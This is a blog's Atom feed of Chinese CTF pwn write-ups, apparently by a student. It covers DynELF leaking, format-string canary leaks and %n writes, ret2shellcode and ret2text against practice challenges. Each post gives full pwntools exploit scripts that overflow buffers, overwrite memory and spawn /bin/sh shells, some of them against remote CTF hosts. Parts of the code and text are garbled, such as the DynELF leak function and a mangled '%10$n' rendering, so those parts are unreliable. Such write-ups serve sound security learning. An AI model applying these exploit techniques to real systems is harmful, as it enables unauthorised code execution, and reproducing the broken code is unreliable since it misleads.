<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://cc-nianchu.github.io</id>
    <title>nianchu</title>
    <updated>2021-07-21T05:27:14.290Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://cc-nianchu.github.io"/>
    <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
    <subtitle>nianchu的blog</subtitle>
    <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
    <icon>https://cc-nianchu.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, nianchu</rights>
    <entry>
        <title type="html"><![CDATA[DynELF]]></title>
        <id>https://cc-nianchu.github.io/post/dynelf/</id>
        <link href="https://cc-nianchu.github.io/post/dynelf/">
        </link>
        <updated>2021-07-21T04:27:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="dynelf原理">DynELF原理</h2>
<p>通过信息泄露漏洞，DynELF将对任意内存进行搜索,它首先找到ELF文件在内存中的基地址，然后定位到libe并对其进行解析，从而找到所需函数符号的地址，具体步骤如下。</p>
<p>(1)搜索内存找到字符串“\x7ELF”， 该字符串的地址即为ELF的基地址;</p>
<p>(2)解析ELF文件，得到DYNAMIC段的基地址，并通过该地址得到link map链表，此时有两种方法:一种 是通过.dynamic里的DT DEBUG,它是一个指向 structr debug的指针，其第二个元素指向link map;另一种是通过.got.plt节，其前3项分别是.dynamic、link_ map 和dl _runtime resolve的地址;</p>
<p>(3 )遍历link map,对比1_ name找到libc后，通过1 addr获得libc的基地址;</p>
<p>( 4)解析libc,通过DT_ _GNU HASH、DT STRTAB:和DT SYMTAB分别得到哈希表( .gnu hash/ .hash)、字符串表(sttab )和符号表( symtab );</p>
<p>(5)通过哈希表找到所需函数(如system )的内存地址。</p>
<h2 id="例题-xdctf-2015pwn200-攻防世界进阶区第二题">例题 XDCTF 2015:pwn200  攻防世界进阶区第二题</h2>
<p>获得题目后先checksec pwn_200</p>
<pre><code> Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>打开ida32 F5获得伪代码</p>
<pre><code>int __cdecl main()
{
  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF

  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);
  memset(&amp;buf[24], 0, 0x4Cu);
  setbuf(stdout, buf);
  write(1, buf, strlen(buf));
  sub_8048484();
  return 0;
}
ssize_t sub_8048484()
{
  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF

  setbuf(stdin, buf);
  return read(0, buf, 0x100u);
}
</code></pre>
<h3 id="程序分析">程序分析</h3>
<p>漏洞比较明显，sub 80484840函数试图读取010个字节到个0x6e字节大小的buf上，存在缓冲区溢出漏洞。由于没有Canay,我们可以很轻松地在栈上布置ROP链、并控制EIP。只需要注意32位程序通过栈传递参数。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<p>(1)利用栈溢出，在栈上布置ROP链，修改返回地址，从而控制EIP:</p>
<p>(2 )利用wrieO函数构造DynELF的leak函数，进行信息泄露，从而得到libe,从中查找system0函数的地址;</p>
<p>(3)利用read(0函数将字符串“in/hsx00&quot; 读人.bss 节;</p>
<p>(4)调用system(&quot;/bin/sh&quot;),获得shell.</p>
<p>第一阶段利用DynELF泄露得到system()函数的内存地址，leak func()如下所示。</p>
<pre><code>def leak func (addr) :

io. recvline ()

payload= &quot;А&quot;*(0хбс +4)

payload += p32 (write_ plt)

# write(1, addr, 4)

payload += p32 (pppr_addr)

clean the stack

payload += p32 (1)

payload += p32 (addr)

payload += p32 (4)

payload += p32(_start_addr)                 # start again

io. send (payload)

data = io. recv(4)

log. info(&quot;leaking: 0x%x -&gt; %s&quot; 8 (addr, (data or '') .encode('hex')))
return data
</code></pre>
<p>每次执行write()函数后，都需要一个&quot;pop;pop;pop;ret&quot;的gadget将3个参数弹出，从而使栈达到平衡，然后再返回到start函数开启下一轮，从而满足DynELF需要循环泄漏的条件</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用格式化字符串漏洞获得Canary进行栈溢出]]></title>
        <id>https://cc-nianchu.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-huo-de-canary-jin-xing-zhan-yi-chu/</id>
        <link href="https://cc-nianchu.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-huo-de-canary-jin-xing-zhan-yi-chu/">
        </link>
        <updated>2021-07-18T02:21:16.000Z</updated>
        <content type="html"><![CDATA[<p>题目在攻防世界进阶区第一题Mary_Morton，也是一道基础题<br>
拿到题目先checksec一下</p>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>发现是64位程序，而且开了Canary和NX保护 打开ida64 F5获得伪代码</p>
<pre><code>void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int v3; // [rsp+24h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_4009FF();
  puts(&quot;Welcome to the battle ! &quot;);
  puts(&quot;[Great Fairy] level pwned &quot;);
  puts(&quot;Select your weapon &quot;);
  while ( 1 )
  {
    while ( 1 )
    {
      sub_4009DA();
      __isoc99_scanf(&quot;%d&quot;, &amp;v3);
      if ( v3 != 2 )
        break;
      sub_4008EB();
    }
    if ( v3 == 3 )
    {
      puts(&quot;Bye &quot;);
      exit(0);
    }
    if ( v3 == 1 )
      sub_400960();
    else
      puts(&quot;Wrong!&quot;);
  }
}
</code></pre>
<p>很明显是一道给选择的题目，打开题目函数</p>
<pre><code>int sub_4009DA()
{
  puts(&quot;1. Stack Bufferoverflow Bug &quot;);
  puts(&quot;2. Format String Bug &quot;);
  return puts(&quot;3. Exit the battle &quot;);
}
</code></pre>
<p>题目已经告诉我们1是栈溢出，2是字符串格式化漏洞，但是因为开了Canary，所以要是需要栈溢出我们需要获得Canary的值，才能进行栈溢出。</p>
<pre><code>函数一
unsigned __int64 sub_400960()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(buf, 0, 0x80uLL);
  read(0, buf, 0x100uLL);
  printf(&quot;-&gt; %s\n&quot;, buf);
  return __readfsqword(0x28u) ^ v2;
}
函数二
unsigned __int64 sub_4008EB()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(buf, 0, 0x80uLL);
  read(0, buf, 0x7FuLL);
  printf(buf);
  return __readfsqword(0x28u) ^ v2;
}
后门函数
int sub_4008DA()
{
  return system(&quot;/bin/cat ./flag&quot;);
}
</code></pre>
<p>因为有canary保护，return的是v2，所以v2应该就是canary的值<br>
<img src="https://cc-nianchu.github.io/post-images/1626575797030.png" alt="" loading="lazy"><br>
思路：首先利用字符串漏洞，泄露出canary的值，然后在函数要返回的时候再填回去，之后利用栈溢出，让其返回到后门函数。<br>
字符串格式化漏洞先手计算偏移量</p>
<pre><code>Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
2
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

AAAA 0x7fffc952c6c0 0x7f 0x7f08d64a3151 (nil) (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0xa7025 (nil) (nil) (nil) (nil) (nil)
</code></pre>
<p>在这里发现字符串偏移量为6，再确定canary和输入的参数之间的偏移<br>
buf到v2   0x90-0x08=0x88<br>
因为这是64位的程序，每个格式化字符串都是8字节，同理32位是4字节<br>
所以0x88=136   136/8=17    所以总偏移量为17+6=23<br>
所以第一次先泄漏canary<br>
第一个payload='%23$p'<br>
然后canary=int(recv(16),16)   接受16个字节<br>
然后print canary<br>
构造第二个payload ='a'*0x88+p64(canary)+'a'*8+p64(后门函数地址)<br>
exp如下:</p>
<pre><code>from pwn import *

#r=process('./Mary_Morton')
r=remote('111.200.241.244',63833)

#r.recvuntil('3. Exit the battle')
r.sendline('2')

r.sendline('%23$p')

r.recvuntil('0x')
canary=int(r.recv(16),16)
print (canary)

door_addr=0x4008da
payload='a'*0x88+p64(canary)+'a'*8+p64(door_addr)
#r.recvuntil('3. Exit the battle')
r.sendline('1')
r.sendline(payload)

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[格式字符串]]></title>
        <id>https://cc-nianchu.github.io/post/ge-shi-zi-fu-chuan/</id>
        <link href="https://cc-nianchu.github.io/post/ge-shi-zi-fu-chuan/">
        </link>
        <updated>2021-07-16T06:03:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="攻防世界新手题cgfsb">攻防世界新手题CGfsb</h2>
<p>这道题是在攻防世界新手题 题目介绍为：菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用<br>
拿到题目后我们先用最基础的checksec功能check一下</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>在这里我们发现程序是32位的  用IDA32位打开文件</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF
  __int16 v5; // [esp+26h] [ebp-76h]
  char s[100]; // [esp+28h] [ebp-74h] BYREF
  unsigned int v7; // [esp+8Ch] [ebp-10h]

  v7 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  buf[0] = 0;
  buf[1] = 0;
  v5 = 0;
  memset(s, 0, sizeof(s));
  puts(&quot;please tell me your name:&quot;);
  read(0, buf, 0xAu);
  puts(&quot;leave your message please:&quot;);
  fgets(s, 100, stdin);
  printf(&quot;hello %s&quot;, (const char *)buf);
  puts(&quot;your message is:&quot;);
  printf(s);
  if ( pwnme == 8 )
  {
    puts(&quot;you pwned me, here is your flag:\n&quot;);
    system(&quot;cat flag&quot;);
  }
  else
  {
    puts(&quot;Thank you!&quot;);
  }
  return 0;
}
</code></pre>
<p>根据新手提示 我们很快发现printf(s)；这句话有问题，平时我们学C语言，正确的应该是printf(&quot;%n&quot;,s);<br>
printf（&quot;格式化字符串&quot;,参数...)</p>
<pre><code class="language-格式化说明符有这些：">%d - 十进制 - 输出十进制整数
%s - 字符串 - 从内存中读取字符串
%x - 十六进制 - 输出十六进制数
%c - 字符 - 输出字符
%p - 指针 - 指针地址
%n - 到目前为止所写的字符数
</code></pre>
<p>我们需要注意的是%n 这个格式化字符串，它的功能是将%n 之前打印出来的字符<br>
个数，赋值给一个变量。看伪代码，我们发现让pwnme==8;这句话成立之后我们就可以运行cat flag 获得flag<br>
因此我们需要：<br>
1、我们需要将 pwnme 的地址输入到 s（也就是 message）中去<br>
2、在合适的位置上加一个<code>%n</code>，使其与我们输入的地址对应从而造成漏洞利用<br>
但我们需要知道输入进去的数据在栈中偏移了多少，知道偏移量后我们就可以利用pwnme。<br>
运行程序:</p>
<pre><code>please tell me your name:
nianchu
leave your message please:
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
hello nianchu
your message is:
AAAA 0xffc1cc3e 0xf7f4b5c0 0xffc1cc8c 0xf7f91a9c 0x1 0xf7f64410 0x696e0001 0x68636e61 0xa75 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
Thank you!
</code></pre>
<p>在这里我们数数AAAA对应的应该是0x41414141，我们发现0x41414141在第10个，偏移量便为10<br>
需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们要用到第十个，所以是%10$n<br>
所以EXP就有了</p>
<pre><code>from pwn import*
#q=precess(&quot;./CGfsb&quot;)
q=remote('111.200.241.244',51786)

pwnme_addr=0x0804A068
payload=p32(pwnme_addr)+'ssbb'+'%10$n'
q.recvuntil(&quot;please tell me your name:\n&quot;)
q.sendline('nianchu')
q.recvuntil(&quot;leave your message please:\n&quot;)
q.sendline(payload)

q.interactive()
</code></pre>
<h2 id="buu上的第五空间2019-决赛pwn5">buu上的[第五空间2019 决赛]PWN5</h2>
<p>这是一道很明显格式化字符串不过应该还有其他的解法以后学了再来用其他的方法，主要是发现了/bin/sh<br>
这道题我是用格式化字符串做的但是不是很熟练做了好久，又get到新知识。<br>
首先checksec一下pwn5文件</p>
<pre><code>Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
</code></pre>
<p>然后用ida32位打开pwn5文件 按F5打开伪代码</p>
<pre><code>int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &amp;a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open(&quot;/dev/urandom&quot;, 0);
  read(fd, &amp;dword_804C044, 4u);        //随机4位数
  printf(&quot;your name:&quot;);
  read(0, buf, 0x63u);
  printf(&quot;Hello,&quot;);
  printf(buf);
  printf(&quot;your passwd:&quot;);
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
     puts(&quot;ok!!&quot;);
     system(&quot;/bin/sh&quot;);
  }
  else
  {
     puts(&quot;fail&quot;);
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
     sub_80493D0();
  return result;
}
</code></pre>
<p>能运行system(&quot;/bin/sh&quot;)很明显是要atoi(nptr)=dword_804C044，这是一道验证账号密码题目，密码在上面会随机4位数，但是我们利用格式化字符串将密码改成自己想要的就行了，%d读取数字，%x读取地址，%s读取任意地址的内容，%n任意地址写入。 例如aaaa%n=4,因为要写入4位数所以我们在0x804C044这个地址上得分4byte<br>
<img src="https://cc-nianchu.github.io/post-images/1626489125752.png" alt="" loading="lazy"><br>
这里配合上面讲的%10<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">样</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">道</mi><mi mathvariant="normal">理</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">n，一样的道理，%10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">道</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">，</span></span></span></span>n是一次占4个字节，因此我们分开。<br>
首先我们得找到偏移量，打开程序输入AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</p>
<pre><code>your name:AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Hello,AAAA 0xffe1b8d8 0x63 (nil) 0xf7f8da9c 0x3 0xf7f60410 0x1 (nil) 0x1 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
��s��your passwd:
</code></pre>
<p>我们可以发现第十个就是偏移量，现在也找到偏移量也找到函数地址0x804c044，<br>
而密码就是4 * len(p32()) = 0x10直接上EXP</p>
<pre><code>from pwn import*
#q=process(&quot;./pwn5&quot;)

q=remote('node4.buuoj.cn',28993)

addr=0x0804c044

payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)

payload+='%10$hhn%11$hhn%12$hhn%13$hhn'
#payload+='%10$n%11$n%12$n%13$n'
#q.recvuntil(&quot;your name:\n&quot;)
q.sendline(payload)

#q.recvuntil(&quot;your passwd:\n&quot;)
payload=str(0x10101010)

q.sendline(payload)

q.interactive()
</code></pre>
<p>另外提醒一下  py文件不能起名为pwn.py，我也不懂为什么，反正起名了这个我搞了好久都是有错误上网找了好久都不行，后面发现改了个名字就能运行了。。。。。。。。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[shellcode 基础]]></title>
        <id>https://cc-nianchu.github.io/post/shellcode-ji-chu/</id>
        <link href="https://cc-nianchu.github.io/post/shellcode-ji-chu/">
        </link>
        <updated>2021-07-14T12:17:14.000Z</updated>
        <summary type="html"><![CDATA[<p>shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。<br>
ret2shellcode题型喝ret2text差不多，但ret2shellcode没有/bin/sh 后门直接利用的地址，因此我们需要自己构造shellcode。<br>
shellcode（指令为:shellcode = asm(shellcraft.sh())）<br>
题目ret2shellcode，做题前需要checksec一下有什么保护以及是多少位的程序</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>在这里发现是32位程序而且开了NX保护打开IDA32按F5进入main函数伪代码</p>
<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
<p>很明显跟ret2text一样 有gets（）函数和strncpy函数，gets函数是不限制输入内容，仅收到回车后结束，即有溢出                                  //gets（），直接读取一行，忽略'\x00'<br>
我们先找buf2的地址作为shellcode 地址   在ida32很容易发现</p>
]]></summary>
        <content type="html"><![CDATA[<p>shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。<br>
ret2shellcode题型喝ret2text差不多，但ret2shellcode没有/bin/sh 后门直接利用的地址，因此我们需要自己构造shellcode。<br>
shellcode（指令为:shellcode = asm(shellcraft.sh())）<br>
题目ret2shellcode，做题前需要checksec一下有什么保护以及是多少位的程序</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>在这里发现是32位程序而且开了NX保护打开IDA32按F5进入main函数伪代码</p>
<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
<p>很明显跟ret2text一样 有gets（）函数和strncpy函数，gets函数是不限制输入内容，仅收到回车后结束，即有溢出                                  //gets（），直接读取一行，忽略'\x00'<br>
我们先找buf2的地址作为shellcode 地址   在ida32很容易发现</p>
<!-- more -->
<p>.bss:0804A080    buf2            db 64h dup(?)           ;</p>
<!-- more -->
<p>然后确定栈溢出覆盖返回地址的位置，可以手动计算，这里使用cyclic；<br>
cyclic pattern是一个很好用的功能，pattern就是指一个字符串。在完成溢出题目时，使用cyclic pattern可以大大减少计算溢出点的时间。<br>
<img src="https://cc-nianchu.github.io/post-images/1626265826546.png" alt="" loading="lazy"><br>
可以发现在0x62616164中溢出<br>
输入cyclic -l 0x0626164  可以得到偏移量为112<br>
因此我们可以构造payload<br>
payload=shellcode.ljust(112,'a')+p32（0x0804A080)<br>
EXP如下</p>
<pre><code>from pwn import *

q = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

qsendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
q.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[构造基本rop]]></title>
        <id>https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/</id>
        <link href="https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/">
        </link>
        <updated>2021-07-14T00:55:46.000Z</updated>
        <summary type="html"><![CDATA[<pre><code> 能构造rop的题目得满足一下条件：
        程序存在溢出，并且可以控制返回地址。
        可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
</code></pre>
<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。😳</p>
<h2 id="ret2text">ret2text</h2>
<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP;<br>
做题目前首先得查看一下程序的保护机制</p>
]]></summary>
        <content type="html"><![CDATA[<pre><code> 能构造rop的题目得满足一下条件：
        程序存在溢出，并且可以控制返回地址。
        可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
</code></pre>
<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。😳</p>
<h2 id="ret2text">ret2text</h2>
<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP;<br>
做题目前首先得查看一下程序的保护机制</p>
<!-- more -->
<p>Arch:     i386-32-little<br>
RELRO:    Partial RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x8048000)</p>
<!-- more -->
<p>很明显可以看出这是32位程序，只开了NX保护<br>
我们用ida32打开文件   按F5进入main函数</p>
<!-- more -->
<p>int __cdecl main(int argc, const char **argv, const char **envp)<br>
{<br>
char s[100]; // [esp+1Ch] [ebp-64h] BYREF</p>
<p>setvbuf(stdout, 0, 2, 0);<br>
setvbuf(_bss_start, 0, 1, 0);<br>
puts(&quot;There is something amazing here, do you know anything?&quot;);<br>
gets(s);<br>
printf(&quot;Maybe I will tell you next time !&quot;);<br>
return 0;<br>
}</p>
<!-- more -->
<p>发现gets（）函数，gets是不限制输入内容，仅收到回车后结束 //gets，直接读取一行，忽略'\x00'<br>
再查看其他函数发现/bin/sh          //经典后面函数直接进入系统</p>
<!-- more -->
<p>void secure()<br>
{<br>
unsigned int v0; // eax<br>
int input; // [esp+18h] [ebp-10h] BYREF<br>
int secretcode; // [esp+1Ch] [ebp-Ch]</p>
<p>v0 = time(0);<br>
srand(v0);<br>
secretcode = rand();<br>
__isoc99_scanf((int)&amp;unk_8048760, (int)&amp;input);<br>
if ( input == secretcode )<br>
system(&quot;/bin/sh&quot;);<br>
}</p>
<!-- more -->
<p>再ida找到/bin/sh的地址</p>
<!-- more -->
<p>.text:080485FD                 push    ebp<br>
.text:080485FE                 mov     ebp, esp<br>
.text:08048600                 sub     esp, 28h<br>
.text:08048603                 mov     dword ptr [esp], 0 ; timer<br>
.text:0804860A                 call    _time<br>
.text:0804860F                 mov     [esp], eax      ; seed<br>
.text:08048612                 call    _srand<br>
.text:08048617                 call    _rand<br>
.text:0804861C                 mov     [ebp+secretcode], eax<br>
.text:0804861F                 lea     eax, [ebp+input]<br>
.text:08048622                 mov     [esp+4], eax<br>
.text:08048626                 mov     dword ptr [esp], offset unk_8048760<br>
.text:0804862D                 call    ___isoc99_scanf<br>
.text:08048632                 mov     eax, [ebp+input]<br>
.text:08048635                 cmp     eax, [ebp+secretcode]<br>
.text:08048638                 jnz     short locret_8048646<br>
.text:0804863A                mov  dword ptr [esp], offset command ; &quot;/ bin/sh<br>
.text:08048641                 call    _system</p>
<!-- more -->
<p>发现/bin/sh地址在0x0804863A,这是bin_str=0x0804863A，那么如果我们直接控制程序返回至 0x0804863A<br>
下面就是我们如何构造 payload 了，从gets开始寻找</p>
<!-- more -->
<p>.text:080486A7                 lea     eax, [esp+1Ch]<br>
.text:080486AB                 mov     [esp], eax      ; s<br>
.text:080486AE                 call    _gets</p>
<!-- more -->
<p>利用gdb来打断点</p>
<!-- more -->
<p>pwndbg&gt; b *0x080486AE<br>
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.<br>
pwndbg&gt; r<br>
Starting program: /home/nianchu/Desktop/新手训练/ret2text<br>
There is something amazing here, do you know anything?</p>
<p>Breakpoint 1, 0x080486ae in main () at ret2text.c:24<br>
24	ret2text.c: 没有那个文件或目录.<br>
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>
─────────────────────────────────[ REGISTERS ]──────────────────────────────────<br>
EAX  0xffffcefc —▸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x26f34<br>
EBX  0x0<br>
ECX  0xf7fb7dc7 (<em>IO_2_1_stdout</em>+71) ◂— 0xfb88900a<br>
EDX  0xf7fb8890 (_IO_stdfile_1_lock) ◂— 0x0<br>
EDI  0x0<br>
ESI  0xf7fb7000 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x1d7d8c<br>
EBP  0xffffcf68 ◂— 0x0<br>
ESP  0xffffcee0 —▸ 0xffffcefc —▸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x26f34<br>
EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8</p>
<!-- more -->
<p>从ESP可以发现在esp为0xffffcee0，ebp为0xffffcf68,s为0xffffcefc<br>
·········s 相对于 ebp 的偏移为 0x6c<br>
·········s 相对于返回地址的偏移为 0x6c+4<br>
最后payload构造如下：</p>
<!-- more -->
<p>from pwn import*</p>
<p>q=process('./ret2text')<br>
bin_str=0x0804863A<br>
payload='a'*(0x6c+4)+p32(bin_str)<br>
q.sendline(payload)<br>
q.interactive()</p>
<!-- more -->
<h2 id="cgpwn2">cgpwn2</h2>
<p>这道题在攻防世界的新手题，拿到题目先checksec一下</p>
<pre><code>Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>然后打开ida32位f5获得伪代码</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  hello();
  puts(&quot;thank you&quot;);
  return 0;
}
</code></pre>
<p>可以发现main函数里面啥都没有，只有3个缓冲区和有个hello()函数，继续打开看看</p>
<pre><code>char *hello()
{
  __int16 *v0; // eax
  int v1; // ebx
  unsigned int v2; // ecx
  __int16 *v3; // eax
  __int16 s; // [esp+12h] [ebp-26h] BYREF
  int v6; // [esp+14h] [ebp-24h] BYREF

  v0 = &amp;s;
  v1 = 30;
  if ( ((unsigned __int8)&amp;s &amp; 2) != 0 )
  {
    s = 0;
    v0 = (__int16 *)&amp;v6;
    v1 = 28;
  }
  v2 = 0;
  do
  {
    *(_DWORD *)&amp;v0[v2 / 2] = 0;
    v2 += 4;
  }
  while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );
  v3 = &amp;v0[v2 / 2];
  if ( (v1 &amp; 2) != 0 )
    *v3++ = 0;
  if ( (v1 &amp; 1) != 0 )
    *(_BYTE *)v3 = 0;
  puts(&quot;please tell me your name&quot;);
  fgets(name, 50, stdin);
  puts(&quot;hello,you can leave some message here:&quot;);
  return gets((char *)&amp;s);
}
</code></pre>
<p>前面看不懂没什么关系，主要看到后面有</p>
<pre><code>puts(&quot;please tell me your name&quot;);
  fgets(name, 50, stdin);
  puts(&quot;hello,you can leave some message here:&quot;);
  return gets((char *)&amp;s);
</code></pre>
<p>从gets()函数可以name那里可以看出这里可以栈溢出然后写入我们想要的东西<br>
在函数列表看到一个pwn函数，打开得</p>
<pre><code>int pwn()
{
  return system(&quot;echo hehehe&quot;);
}
</code></pre>
<p>main函数和hello函数里面都没有他，而且这个函数是打印hehehe但是可以获得system函数，<br>
因此我们先通过栈溢出将引用pwn函数再将里面的echo hehehe改成/bin/sh<br>
思路清晰了之后我们可以通过ida找到call system函数的地址，再找name的地址<br>
再找s的偏移量<br>
先通过shift+f4找到pwn函数地址，双击pwn函数<br>
<img src="https://cc-nianchu.github.io/post-images/1626536255632.png" alt="" loading="lazy"><br>
<img src="https://cc-nianchu.github.io/post-images/1626536266388.png" alt="" loading="lazy"><br>
在这里可以发现sys_addr=0x0804855A<br>
在hello函数里可以发现 name_addr=0x0804A080,s的偏移量为24<br>
我们要运行system(/bin/sh)因此我们要输入/bin/sh到sys_addr上<br>
exp:</p>
<pre><code>from pwn import *
q = remote('ip',端口)
sys_addr = 0x804855A
name_addr = 0x804A080
payload = 'a' * 0x26 + 'bbbb' + p32(sys_addr) + p32(name_addr)
q = r.recvuntil('please tell me your name')
q.sendline('/bin/sh')
q = r.recvuntil('hello,you can leave some message here:')
q.sendline(payload)
q.interactive()
</code></pre>
]]></content>
    </entry>
</feed>